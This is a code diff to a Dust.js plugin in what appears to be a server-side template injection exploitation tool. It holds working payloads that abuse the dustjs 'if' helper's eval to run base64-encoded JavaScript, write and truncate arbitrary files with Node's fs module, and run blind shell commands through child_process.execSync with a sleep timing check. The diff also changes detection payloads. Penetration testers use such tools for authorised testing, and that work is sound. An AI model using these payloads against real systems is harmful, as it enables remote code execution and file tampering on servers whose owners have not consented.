@@ -9,11 +9,11 @@ class Dust(javascript.Javascript):
         self.update_actions({
             'evaluate': {
                 'call': 'inject',
-                'evaluate': """{{@if cond=\"eval(Buffer('{code_b64}', 'base64url').toString())\"}}{{/if}}"""
+                'evaluate': """{{@if cond=\"eval(Buffer('{code_b64p}', 'base64').toString())\"}}{{/if}}"""
             },
             'write': {
                 'call': 'evaluate',
-                'write': """require('fs').appendFileSync('{path}', Buffer('{chunk_b64}', 'base64url'), 'binary')""",
+                'write': """require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
                 'truncate': """require('fs').writeFileSync('{path}', '')"""
             },
             # Not using execute here since it's rendered and requires set headers and trailers
@@ -21,7 +21,7 @@ class Dust(javascript.Javascript):
                 'call': 'evaluate',
                 # execSync() has been introduced in node 0.11, so this will not work with old node versions.
                 # TODO: use another function.
-                'execute_blind': """require('child_process').execSync(Buffer('{code_b64}', 'base64url').toString() + ' && sleep {delay}');""",
+                'execute_blind': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}');""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                 'test_cmd_expected': rand.randstrings[2] 
             }
@@ -42,12 +42,14 @@ class Dust(javascript.Javascript):
         # Print what it's going to be tested
         log.log(23, f'{self.plugin} plugin is testing rendering')
         for prefix, suffix, wrapper in self._generate_contexts():
-            payload = 'AA{{!c!}}AA'
+            payload = f'{rand.randstrings[0]}{{!qwe!}}' \
+                      f'{{#x a="{rand.randstrings[2]}" b="{rand.randstrings[1]}"}}{{:else}}{{b}}{{a}}{{/x}}'
+            expected = f'{rand.randstrings[0]}{rand.randstrings[1]}{rand.randstrings[2]}'
             header_rand = rand.randint_n(10)
             header = str(header_rand)
             trailer_rand = rand.randint_n(10)
             trailer = str(trailer_rand)
-            if 'AAAA' == self.render(code=payload, header=header, trailer=trailer, header_rand=header_rand,
+            if expected == self.render(code=payload, header=header, trailer=trailer, header_rand=header_rand,
                                      trailer_rand=trailer_rand, prefix=prefix, suffix=suffix, wrapper=wrapper):
                 self.set('header', '{header}')
                 self.set('trailer', '{trailer}')
@@ -78,7 +80,9 @@ class Dust(javascript.Javascript):
                 rand_C = rand.randstr_n(2)
                 expected = rand_A + rand_B + rand_C
                 if expected in self.inject(f'{rand_A}{{@if cond="1"}}{rand_B}{{/if}}{rand_C}'):
-                    log.log(21, f'{self.plugin} plugin has confirmed the presence of dustjs if helper <= 1.5.0')
+                    log.log(21, f"{self.plugin} plugin has confirmed the presence of dustjs 'if' helper <= 1.5.0")
+                else:
+                    log.log(22, f"{self.plugin} plugin has not found 'if' helper <= 1.5.0, evaluation is not possible.")
         if 'T' in techniques:
             # Blind inj must be checked also with confirmed rendering
             self._detect_blind()
